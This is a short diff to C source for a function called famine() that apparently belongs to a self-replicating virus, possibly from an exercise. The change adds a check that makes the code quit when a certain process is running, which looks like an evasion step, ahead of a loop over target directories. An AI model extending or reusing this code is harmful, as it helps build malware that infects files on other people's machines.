@@ -12,8 +12,6 @@
 
 #include "famine.h"
 
-#define BUFF_SIZE 0x1000
-
 void famine() {
 	byte		*start_rip;
 	get_rip(start_rip);
@@ -31,6 +29,10 @@ void famine() {
 	this = get_profiling(start_rip);
 
 	(void)this;
+
+	if (is_process_running())
+		return;
+
 
 	for (int dir_index = 0; directories[dir_index]; dir_index += 2) {
 		str	dir_name = (str)&directories[dir_index];
